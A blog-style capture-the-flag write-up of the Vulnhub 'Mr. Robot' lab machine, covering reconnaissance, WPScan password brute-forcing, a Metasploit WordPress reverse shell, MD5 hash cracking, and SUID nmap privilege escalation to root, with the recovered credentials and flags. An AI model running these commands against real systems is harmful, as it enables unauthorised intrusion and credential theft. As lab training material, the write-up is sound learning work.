---
title: "Mr. Robot"
date: 2020-12-25T01:02:30-06:00
draft: false
author: "Golgothus"
description: "Vulnhub - Mr. Robot room."
summary: "Vulnhub - Mr. Robot write-up."
tags: ["Vulnhub","Linux","Privesc"]
featuredImage: "/images/city.jpg"
categories: ["Vulnhub"]
---
# Mr Robot

First Vulnhub box coming up in the books!

Kicking it off with [Mr. Robot](https://www.vulnhub.com/entry/mr-robot-1,151/). Being super new to a lot of the "open" systems that are vulnerable, I had a tough time learning how to segment my network in a way that would allow my attacking box to be on my hosts network, while also being able to attack the exploitable box which is operating in its own segemented network.

We will find out more about that short process in another post.

So how do we get in? My friends told me, you have to "break" your way in. Time to "know your enemy" or in this case, "exploit". I kick off the below nmap scan:

```bash
nmap -sV 10.10.0.0/24
```

I used the above range as I know that's the IP address range within which I set my vulnerable box to sit in.

I get an IP of 10.10.0.130, with the following ports showing as open:

```bash
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
443/tcp open   ssl/http Apache httpd
```

With this, we can tell that there *should* be a website open and running. Since both 80 and 443 are operable, let's check it out. I looked over 10.10.0.130/robots.txt after having visited the initial site we see a nice little screen with references to the show.

![Mr Robot site](/images/2020-10-04-21-30-50.png)

Having had previous experience with web apps and application security, I know one of the first places you should look, or at least look for, is robots.txt. Should I be damned, there is a robots.txt present which provides the following:

```bash
User-agent: *
fsocity.dic
key-1-of-3.txt
```

When you view the site for [key-1-of-3.txt](http://10.10.0.130/key-1-of-3.txt) we get the following flag:
073403c8a58a1f80d943455fb30724b9

## Now on to flag 2:

I ended up breaking out of the front page by going to site/question which came up with a wordpress hosted site. I see there's a login available at [http://10.10.0.130/wp-login.php](http://10.10.0.130/wp-login.php)

Now to try and get us a login!

Let's pull down our dictionary list if we haven't already, then my friends mentioned to run the following:

```bash
sort fsocity.dic
cat -n fsocity.dic | uniq > newDic.dic
```

The reason we did this was due to the initial .dic file has 850,000+ lines of "passwords". The above line(s) will go through and sort the lines alphabetically, we then take this list and pull out any duplicate lines, then output it into a new file so we leave our initial list untouched.

Now, onto exploitation! We know this is a WordPress site, let's check out WPScan.

```bash
wpscan --url 10.10.0.130
```

We see the version of WordPress listed as:
WordPress version 4.3.1 identified (Insecure, released on 2015-09-15)

However, my friends mentioned the following command set:

```bash
wpscan --url 10.10.0.130 -U elliot -P newDic.dic
```

This would perform a brute-force attack against the site using the newDic password list we obtained when we found flag 2.

We get the following information for elliot

|username|password|
|---|---|
|elliot|ER28-0652|

We go through and get our meterpreter session

```bash
msfconsole
search wordpress 4.3
use 80
```

The reason I am using exploit 80 - *unix/webapp/wp_admin_shell_upload* is we're aiming to get a reverse shell into the server hosts system.

Next we have to setup a few of our options, in this case it seems decently wise to run:

```bash
show advanced
```

I setup my options similar to the following:

|command|option|
|---|---|
|set rhost | 10.0.0.128 |
|set lhost | 10.0.0.129 | 
|set username | elliot |
|set password | ER28-0652 |


What ends up happening if we set our options as we have above, is we then get a check saying *Exploit aborted due to failure: not-found: The target does not appear to be using Wordpress*

When we run `show advanced` it gives us an option for *wpcheck*. Let's go ahead and set this as well.

|command|option|
|---|---|
|set wpcheck | false |

Now we can run our exploit.

```bash
exploit
```

Give it a short moment and we should then get the response that our Meterpreter sessions 1 is open.

It seems that we don't have a fully interactive shell yet for our session. Using the following resource from [ropnop.com](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/) we ran the following lines.

```bash
shell
python -c 'import pty; pty.spawn("/bin/bash")'
```

Where do we go from here? Let's check out some of the users in /etc/passwd/ see who all has a login shell at their disposal.

```bash
cat /etc/passwd
```

Looking through the list we see a few potential targets:

```bash
mysql:x:1001:1001::/home/mysql:
varnish:x:999:999::/home/varnish:
robot:x:1002:1002::/home/robot:
```

I ran `ls /home/` to see who all has an available and existing user directory and the only result turns out to be none other than the user *robot*.

Let's see what kind of useful information they have for our disposal.

We can see the flag file exists, but we don't have access due to us not actually having read permissions. However, we **are** able to see the contents for the password.raw-md5 file.

```bash
cd /home/robot
cat *
cat: key-2-of-3.txt: Permission denied
robot:c3fcd3d76192e4007dfb496cca67e13b
```

Let's open up another tab in our terminal on our attacking system and run hashcat:

```bash
hashcat -m 0 c3fcd3d76192e4007dfb496cca67e13b /usr/share/wordlists/rockyou.txt
```

Inversely we could also use [crackstation](https://crackstation.net/). After a couple of moments the process completes and gives us the password for the user `robot`.

```bash
c3fcd3d76192e4007dfb496cca67e13b:abcdefghijklmnopqrstuvwxyz
su robot
```

Type in the password, and let's open up the flag file to get flag number 2.

flag2 - 822c73956184f694993bede3eb39f959

## Flag 3 - Final one

To be honest, I had no idea where / how to work on getting some privilege escalation done in order to get us to root. One of my teammates suggested nmap.

We went through it and were able to get an interactive privileged session we could escape which allowed us to have a root owned shell.

Long story short, there's a SUID permission which we can use the following search to find:

```bash
find / -perm -u=s -type f 2>/dev/null
```

You can find more information on SUID permissions on the below site:
[https://pentestlab.blog/](https://pentestlab.blog/2017/09/25/suid-executables/)

An example they used was nmap. Easy enough to say, that's what we will be using here as well.

```bash
nmap --interactive
nmap> !sh
#whoami
root
#
```

Now where could that last flag be? 🤔 No place like home!

```bash
cat /root/*
```

flag3 - 04787ddef27c3dee1ee161b21670b4e4